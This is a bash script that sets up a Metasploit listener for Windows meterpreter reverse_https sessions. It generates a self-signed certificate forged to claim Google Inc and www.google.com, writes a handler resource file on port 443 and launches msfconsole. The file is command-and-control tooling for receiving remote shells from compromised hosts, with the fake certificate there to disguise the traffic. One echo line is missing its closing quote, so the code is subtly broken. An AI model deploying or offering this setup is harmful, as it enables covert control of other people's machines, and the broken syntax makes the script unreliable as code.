#!/bin/bash
# author: (@0rbz_)

if [[ $1 == "" ]]; then
  echo "Description: Generates an SSL certificate and resource file for meterpreter reverse_https listener"
  echo "Usage: ./meterpreter_cert.sh [certname]
  exit 1;
fi

CERTNAME="$1"

if [ "$CERTNAME" ]; then

        openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=US/ST=California/L=Mountain View/O=Google Inc/CN=www.google.com" -keyout $CERTNAME.key -out $CERTNAME.crt && cat $CERTNAME.key $CERTNAME.crt > $CERTNAME.pem && rm -f $CERTNAME.key  $CERTNAME.crt
fi
echo "use exploit/multi/handler
set ExitOnSession false
set LHOST 0.0.0.0
set LPORT 443
set PAYLOAD windows/meterpreter/reverse_https
set HandlerSSLCert $CERTNAME.pem
exploit -j" > $CERTNAME.rc

echo "Starting msfconsole with cert and resource file."

msfconsole -r $CERTNAME.rc
